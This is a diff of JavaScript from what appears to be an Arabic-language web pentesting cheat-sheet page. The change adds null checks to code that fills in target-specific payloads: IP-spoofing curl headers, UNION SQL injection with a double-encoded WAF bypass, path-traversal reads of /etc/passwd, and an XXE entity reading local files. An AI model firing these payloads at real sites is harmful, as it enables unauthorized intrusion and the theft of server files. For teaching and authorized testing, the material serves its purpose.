@@ -1012,25 +1012,25 @@ Request to: http://example.com/index.php?page=../../../../var/log/apache2/access
       const lfiFile = document.getElementById('wahh-lfi-path').value.trim() || '/etc/passwd';
       
       // Update curl
-      document.getElementById('cmd-wahh-curl').innerHTML = `curl -i -X OPTIONS https://${domain}/\ncurl -i -H "X-Forwarded-For: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" https://${domain}/`;
+      (document.getElementById('cmd-wahh-curl') || {}).innerHTML = `curl -i -X OPTIONS https://${domain}/\ncurl -i -H "X-Forwarded-For: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" https://${domain}/`;
       
       // Update SQLi
-      document.getElementById('cmd-wahh-sqli').innerHTML = `http://${domain}/item.php?${param}=-1 UNION SELECT 1,2,database(),version()--`;
-      document.getElementById('cmd-wahh-sqli-waf').innerHTML = `# ترميز البايلود بالـ URL المزدوج\nhttp://${domain}/item.php?${param}=-1%2520UNION%2520SELECT%25201,2,3--`;
+      (document.getElementById('cmd-wahh-sqli') || {}).innerHTML = `http://${domain}/item.php?${param}=-1 UNION SELECT 1,2,database(),version()--`;
+      (document.getElementById('cmd-wahh-sqli-waf') || {}).innerHTML = `# ترميز البايلود بالـ URL المزدوج\nhttp://${domain}/item.php?${param}=-1%2520UNION%2520SELECT%25201,2,3--`;
       
       // Update LFI
-      document.getElementById('cmd-wahh-lfi').innerHTML = `http://${domain}/index.php?page=../../../../..${lfiFile}`;
+      (document.getElementById('cmd-wahh-lfi') || {}).innerHTML = `http://${domain}/index.php?page=../../../../..${lfiFile}`;
       
       // Update XML/XXE
-      document.getElementById('cmd-wahh-xxe').innerHTML = `&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM "file://${lfiFile}" &gt;]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;`;
+      (document.getElementById('cmd-wahh-xxe') || {}).innerHTML = `&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM "file://${lfiFile}" &gt;]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;`;
       
       // Update Table Cells
-      document.getElementById('td-wahh-sqli').innerHTML = `<code>http://${domain}/item.php?${param}=-1 UNION SELECT 1,2,database(),version()--</code>`;
-      document.getElementById('td-wahh-lfi').innerHTML = `<code>http://${domain}/index.php?page=../../../../..${lfiFile}</code>`;
-      document.getElementById('td-wahh-xxe-td').innerHTML = `<code>&lt;!ENTITY xxe SYSTEM "file://${lfiFile}"&gt;</code>`;
+      (document.getElementById('td-wahh-sqli') || {}).innerHTML = `<code>http://${domain}/item.php?${param}=-1 UNION SELECT 1,2,database(),version()--</code>`;
+      (document.getElementById('td-wahh-lfi') || {}).innerHTML = `<code>http://${domain}/index.php?page=../../../../..${lfiFile}</code>`;
+      (document.getElementById('td-wahh-xxe-td') || {}).innerHTML = `<code>&lt;!ENTITY xxe SYSTEM "file://${lfiFile}"&gt;</code>`;
 
       // Update Simulator outputs
-      document.getElementById('sim-wahh-curl').innerHTML = `HTTP/2 200 OK\nAllow: GET, POST, OPTIONS, HEAD\nServer: nginx\nTarget audited: ${domain}\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff`;
+      (document.getElementById('sim-wahh-curl') || {}).innerHTML = `HTTP/2 200 OK\nAllow: GET, POST, OPTIONS, HEAD\nServer: nginx\nTarget audited: ${domain}\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff`;
     }
 
     function copyCode(btn) {
